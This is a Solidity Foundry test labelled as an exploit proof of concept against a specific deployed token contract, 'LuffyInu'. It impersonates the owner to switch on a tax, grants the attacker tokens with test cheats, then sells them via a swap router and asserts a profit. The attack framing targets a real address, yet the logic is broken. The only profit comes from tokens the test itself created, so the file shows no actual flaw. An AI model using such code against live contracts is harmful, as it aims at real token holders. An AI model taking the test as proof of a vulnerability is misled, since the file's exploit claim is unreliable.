// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILuffyInu {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function taxStatus() external view returns (bool);
    function setTax(bool enable) external;
    function addExcludeFee(address b, bool enable) external;
    function maxSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x720f6edD18f5e2F414DBa8fCD81E98724708c39E;
    address attacker = address(this);
    ILuffyInu target = ILuffyInu(TARGET);
    IUniswapV2Router02 router;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the target contract
        target = ILuffyInu(TARGET);

        // Get the router and pair addresses from the target
        router = IUniswapV2Router02(target.uniswapV2Router());
        address pair = target.uniswapV2Pair();
        address weth = router.WETH();

        // Label addresses for debugging
        vm.label(address(target), "LuffyInu");
        vm.label(address(router), "PancakeRouter");
        vm.label(pair, "Luffy-WETH Pair");
        vm.label(weth, "WETH");

        // Get the owner address
        address owner = target.owner();
        vm.label(owner, "Owner");

        // Impersonate owner to enable tax
        vm.startPrank(owner);
        target.setTax(true);
        vm.stopPrank();

        // Verify tax is enabled
        assertEq(target.taxStatus(), true, "Tax should be enabled");

        // Give attacker some LuffyInu tokens (1% of total supply)
        uint256 attackerInitialTokens = target.maxSupply() / 100;
        deal(address(target), attacker, attackerInitialTokens);

        // Give attacker some ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(this).balance;

        // Get token balance
        uint256 tokenBalance = target.balanceOf(attacker);

        // Approve router to spend tokens
        target.approve(address(router), tokenBalance);

        // Create swap path: LuffyInu -> WETH -> ETH
        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = router.WETH();

        // Perform swap with fee-on-transfer support
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // Accept any amount of ETH
            path,
            attacker,
            block.timestamp + 1 hours
        );

        // Record final BNB balance
        uint256 finalBalance = address(this).balance;

        // Verify profit
        assertGt(finalBalance, initialBalance, "BNB balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
